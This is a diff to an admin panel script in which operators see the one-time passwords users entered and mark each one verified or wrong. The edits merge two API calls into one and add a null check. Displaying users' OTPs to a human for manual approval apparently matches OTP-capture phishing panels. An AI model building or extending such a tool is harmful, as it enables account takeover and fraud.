@@ -103,7 +103,7 @@ function extractUserOtp(dataObj) {
       return val;
     }
   }
-  return dataObj.entered_otp || dataObj.otp || dataObj['Entered OTP'] || 'Not entered yet';
+  return dataObj.entered_otp || dataObj.otp || dataObj['Entered OTP'] || dataObj['entered_otp'] || 'Not entered yet';
 }
 
 function draw() {
@@ -177,7 +177,7 @@ document.addEventListener('click', async e => {
   if (correctBtn) {
     const id = correctBtn.dataset.otpCorrect;
     await act(async () => {
-      try { await api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/status`, { body: { s: 'success' } }); } catch(e){}
+      // Send single comprehensive update payload to avoid partial failure on Cloudflare Worker routes
       await api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/remark`, {
         body: { s: 'success', data: { otp_status: 'verified' }, remark: 'OTP Verified & Request Approved' }
       });
@@ -189,7 +189,6 @@ document.addEventListener('click', async e => {
   if (wrongBtn) {
     const id = wrongBtn.dataset.otpWrong;
     await act(async () => {
-      try { await api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/status`, { body: { s: 'failed' } }); } catch(e){}
       await api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/remark`, {
         body: { s: 'failed', data: { otp_status: 'wrong' }, remark: 'Incorrect OTP' }
       });
@@ -199,7 +198,9 @@ document.addEventListener('click', async e => {
 
   const sv = e.target.closest('[data-sv]');
   if (sv) {
-    const id = sv.dataset.sv, text = document.getElementById('rk-' + id).value;
+    const id = sv.dataset.sv;
+    const textArea = document.getElementById('rk-' + id);
+    const text = textArea ? textArea.value : '';
     return act(() => api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/remark`, {body: {remark: text}}));
   }
   const b = e.target.closest('[data-o]');
